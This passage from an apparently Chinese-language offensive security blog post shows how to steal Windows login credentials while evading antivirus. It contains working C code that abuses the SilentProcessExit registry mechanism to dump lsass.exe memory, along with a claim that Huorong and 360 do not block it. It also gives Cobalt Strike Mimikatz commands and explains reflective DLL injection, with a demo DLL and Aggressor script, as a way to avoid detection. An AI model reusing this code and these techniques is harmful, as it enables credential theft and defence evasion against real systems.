                break;
            }
            printf(" - 注册表设置完成 ...\n");
            ret = TRUE;
        } while (FALSE);
        free(subkeyIFEO);
        free(subkeySPE);
        if (hkResSubIFEO)
            CloseHandle(hkResSubIFEO);
        if (hkResSubSPE)
            CloseHandle(hkResSubSPE);
        return ret;
    }
    DWORD getPidByName(PCWCHAR procName) {
        HANDLE hProcSnapshot;
        DWORD retPid = -1;
        hProcSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        PROCESSENTRY32W pe;
        if (INVALID_HANDLE_VALUE == hProcSnapshot) {
            printf(" - 创建快照失败!\n");
            return -1;
        }
        pe.dwSize = sizeof(PROCESSENTRY32W);
        if (!Process32First(hProcSnapshot, &pe)) {
            printf(" - Process32First Error : %#X\n", GetLastError());
            return -1;
        }
        do {
            if (!lstrcmpiW(procName, PathFindFileName(pe.szExeFile))) {
                retPid = pe.th32ProcessID;
            }
        } while (Process32Next(hProcSnapshot, &pe));
        CloseHandle(hProcSnapshot);
        return retPid;
    }
    INT main() {
        PCWCHAR targetProcName = L"lsass.exe";
        DWORD pid = -1;
        HMODULE hNtMod = NULL;
        fRtlReportSilentProcessExit fnRtlReportSilentProcessExit = NULL;
        HANDLE hLsassProc = NULL;
        NTSTATUS ntStatus = -1;
        if (!EnableDebugPriv()) {
            printf(" - 启用当前进程DEBUG权限失败: %#X\n", GetLastError());
            return 1;
        }
        printf(" - 启用当前进程DEBUG权限 OK\n");
        if (!setRelatedRegs(targetProcName)) {
            printf(" - 设置相关注册表键值失败: %#X\n", GetLastError());
            return 1;
        }
        printf(" - 设置相关注册表键值 OK\n");
        pid = getPidByName(targetProcName);
        if (-1 == pid) {
            printf(" - 获取目标进程pid: %#X\n", pid);
            return 1;
        }
        printf(" - 获取目标PID: %#X\n", pid);
        do
        {
            hNtMod = GetModuleHandle(L"ntdll.dll");
            if (!hNtMod) {
                printf(" - 获取NTDLL模块句柄失败\n");
                break;
            }
            printf(" - NTDLL模块句柄: %#X\n", (DWORD)hNtMod);
            fnRtlReportSilentProcessExit = (fRtlReportSilentProcessExit)GetProcAddress(hNtMod, "RtlReportSilentProcessExit");
            if (!fnRtlReportSilentProcessExit) {
                printf(" - 获取API RtlReportSilentProcessExit地址失败\n");
                break;
            }
            printf(" - RtlReportSilentProcessExit地址: %#X\n", (DWORD)fnRtlReportSilentProcessExit);
            hLsassProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION|PROCESS_VM_READ, 0, pid);
            if (!hLsassProc) {
                printf(" - 获取lsass进程句柄失败: %#X\n", GetLastError());
                break;
            }
            printf(" - 获取lsass进程句柄: %#X\n", (DWORD)hLsassProc);
            ntStatus = fnRtlReportSilentProcessExit(hLsassProc, 0);
            printf(" - 结束,查看c:\\temp\\lsass*.dmp...RET CODE : %#X\n", (DWORD)ntStatus);
        } while (false);
        if (hNtMod) 
            CloseHandle(hNtMod);
        if (fnRtlReportSilentProcessExit) 
            CloseHandle(fnRtlReportSilentProcessExit);
        if (hLsassProc)
            CloseHandle(hLsassProc);
        if (fnRtlReportSilentProcessExit)
            fnRtlReportSilentProcessExit = NULL;
        return 0;
    }
并且成功以离线方式导入读取登录凭据:
利用这种方式目前还未被火绒和360进行拦截:
其中进程顺序是`lsassdump.exe->svchost.exe
(WerSvcGroup)->WerFault.exe`，由运行级别为high的Wefault.exe进行dump文件创建。
## 5.CS模块中的Mimikatz
当目标机器在CS上线时，如果是管理员权限或者是SYSTEM权限的话，可以直接使用
    mimikatz sekurlsa::privilege full
    mimikatz sekurlsa::logonpasswords full
之前一直有疑惑，在CS中运行Mimikatz获取登录凭据成功，而通过落地文件方式则会直接被杀，因此CS是如何使用Mimikatz的，换句话说难道CS也是通过上传文件的方式来调用Mimikatz的吗?
其实不然，CS采用的是 **反射dll模块内存加载**
,这个主要实现了cs里的一些功能比如`mimikatz，screenshot，sshagent，hashdump`等等这些功能全部是由反射dll实现的，Cobalt
Strike作者将这些功能拆分成一个个的反射dll在使用时才加载执行
反射dll注入的方式不需要在文件系统存放目标DLL，减少了文件“落地”被删的风险。同时它不需要像常规的DLL注入方式那么套路，因此更容易通过杀软的行为检测。由于反射式注入方式并没有通过`LoadLibrary`等API来完成DLL的装载，DLL并没有在操作系统中”注册”自己的存在，因此用ProcessExplorer等软件也无法检测出进程加载了该DLL
因为本人对此了解不多，具体可以参考[https://www.heibai.org/176.html](https://)这篇文章
借用这篇文章所说的反射DLL注入的核心思路:
我们不想让DLL文件“落地”,
那我们可以在磁盘上存放一份DLL的加密后的版本，然后将其解密之后储存在内存里。我们然后可以用`VirtualAlloc`和`WriteProcessMemory`将DLL文件写入目标进程的虚拟空间中。然而，要”加载”一个DLL，我们使用的LoadLibrary函数要求该DLL必须存在于文件系统中。这可怎么办呢。
没错，我们需要抛弃LoadLibrary，自己来实现整个装载过程！我们可以为待注入的DLL添加一个导出函数，`ReflectiveLoader`，
**这个函数实现的功能就是装载它自身**
。那么我们只需要将这个DLL文件写入目标进程的虚拟空间中，然后通过DLL的导出表找到这个`ReflectiveLoader`并调用它，我们的任务就完成了。
于是，我们的任务就转到了编写这个ReflectiveLoader上。由于ReflectiveLoader运行时所在的DLL还没有被装载，它在运行时会受到诸多的限制，例如无法正常使用全局变量等。而且，由于我们无法确认我们究竟将DLL文件写到目标进程哪一处虚拟空间上，所以我们编写的ReflectiveLoader必须是地址无关的。也就是说，ReflectiveLoader中的代码无论处于虚拟空间的哪个位置，它都必须能正确运行。这样的代码被我们称为“地址无关代码”(position-independent code, PIC)。
要实现反射式注入DLL我们需要两个部分，`注射器`和`被注入的DLL`。其中，被注入的DLL除了需要导出一个函数ReflectiveLoader来实现对自身的加载之外，其余部分可以正常编写源代码以及编译。而注射器部分只需要将被注入的DLL文件写入到目标进程，然后将控制权转交给这个ReflectiveLoader即可。因此，注射器的执行流程如下：
  *     1. 将待注入DLL读入自身内存(利用解密磁盘上加密的文件、网络传输等方式避免文件落地)
  *     1. 利用VirtualAlloc和WriteProcessMemory在目标进程中写入待注入的DLL文件
  *     1. 利用CreateRemoteThread等函数启动位于目标进程中的`ReflectiveLoader`
CS中`Aggressor Script`脚本提供了一些关于反射DLL的接口：
我们来看一下具体的实现方法:
    BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved ) {
        BOOL bReturnValue = TRUE;
        switch( dwReason ) {
            case DLL_QUERY_HMODULE:
                if( lpReserved != NULL )
                    *(HMODULE *)lpReserved = hAppInstance;
                break;
            case DLL_PROCESS_ATTACH:
                hAppInstance = hinstDLL;
                /* print some output to the operator */
                if (lpReserved != NULL) {
                    printf("Hello from test.dll. Parameter is '%s'\n", (char *)lpReserved);
                }
                else {
                    printf("Hello from test.dll. There is no parameter\n");
                }
                /* flush STDOUT */
                fflush(stdout);
                /* we're done, so let's exit */
                ExitProcess(0);
                break;
            case DLL_PROCESS_DETACH:
            case DLL_THREAD_ATTACH:
            case DLL_THREAD_DETACH:
                break;
        }
        return bReturnValue;
    }
这是该DLL的主函数，程序通过DLLMain函数的lpReserved来当做参数传递，我们进一步跟进这个反射DLL的项目中查看代码:
和之前分析的一样，先判断该DLL是否存在`ReflectiveLoader`这个导出函数后，利用`VirtualAlloc和WriteProcessMemory`在目标进程中写入待注入的DLL文件，最后利用`reateRemoteThread`函数来启动进程中的`ReflectiveLoader`
这里为了说明和突出反射DLL注入的效果，我们使用作者的项目编译好DLL后可以写一个简单的演示cna:
    alias reflective_dll {
        bdllspawn($1, script_resource("reflective_dll.dll"), $2, "test dll", 5000, false);
    }
将其放置在同一目录下，然后CS加载写好的cna
通过反射DLL注入的方式调用Messagebox
而在CS中Mimikatz也是通过该方式调用，因此避免了文件落地而且同样达到了免杀的目的，并且经过测试在DLL主函数中执行system命令也同样不会被拦截:
* * *
参考文章:
  * [https://modexp.wordpress.com/2019/08/30/minidumpwritedump-via-com-services-dll/](https://)
  * [https://www.archcloudlabs.com/projects/dumping-memory-with-av/](https://)
  * [https://lengjibo.github.io/nod32-bypass/](https://)
  * [https://3gstudent.github.io/MiniDumpWriteDump-via-COM+-Services-DLL-%E7%9A%84%E5%88%A9%E7%94%A8%E6%B5%8B%E8%AF%95](https://)
  * [https://cobaltstrike.com/aggressor-script/functions.html#bdllload](https://)